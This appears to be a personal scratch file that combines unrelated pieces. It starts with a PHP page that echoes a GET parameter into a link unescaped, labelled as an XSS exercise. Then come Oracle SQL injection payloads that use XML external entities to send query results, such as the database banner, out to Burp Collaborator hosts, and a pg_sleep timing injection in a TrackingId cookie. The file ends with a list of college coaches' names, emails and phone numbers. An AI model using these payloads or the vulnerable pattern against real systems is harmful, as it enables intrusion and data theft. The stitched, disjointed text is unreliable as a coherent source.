
<html>
<head>
	<meta content="text/html;charset=utf-8" http-equiv="Content-Type">
    <meta content="utf-8" http-equiv="encoding">
	<title></title>
</head>
<body>
<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="GET">
	  <label>XSS URL Context</label>	 
	  
	  <h2>User Bio : <a href="<?php echo $_GET['name'] ?>" target="_blank">Click to see your profile</a></h2>
	<!--     if (isset($_GET['image'])) {
                    echo "<img src='".htmlentities($_GET['image'])."' class='img-rounded img-responsive' />";
                    echo '<br>';
                } -->
</form>

</body>
</html>




UNION  SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://at7szs7qr3f84c5yocrs52vuwl2bq0.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual -- 
UNION  SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual -- 

TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+banner+from+v$version')||'.va9dgdob8owtlxmj5x8dmncfd6jy7n.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual-- 

TrackingId=x' || pg_sleep(10) --



university : columbia
coach : Joanne Schickerling
Email : jschickerling@gmail.com
----
university : Drexel
coach : John White
Email : jdw322@drexel.edu
----
university : new york university
coach : Sat Seshadri
Email : ss11733@nyu.edu
----
university : connecticut college
coach : Michael Macdonald
Email : mmacdon5@conncoll.edu
----
Amherst	Busani Xaba	(413) 542-5757	        bxaba@amherst.edu
Bates	Reinhold Hergeth 	(207) 786-6341	rhergeth@bates.edu
Bowdoin	Theo Woodward	(207) 725-3984		twoodwar@bowdoin.edu
Colby	Chris Abplanalp	(207) 859-4919		cabplana@colby.edu
Connecticut College	Michael MacDonald	(860) 439-2499	mmacdon5@conncoll.edu
Hamilton	Jamie King	(315) 859-4758		jking@hamilton.edu
Middlebury	Mark Lewis	(802) 443-3458		markl@middlebury.edu
Trinity	Paul Assaiante	(860) 297-2121		paul.assaiante@trincoll.edu
Tufts	Joe Raho	(617) 627-2371	    	joseph.raho@tufts.edu
Wesleyan	Shona Kerr	(860) 685-2444		skerr@wesleyan.edu
Williams	Zafrir Levy	(413) 597-4627		zlevy@williams.edu
----
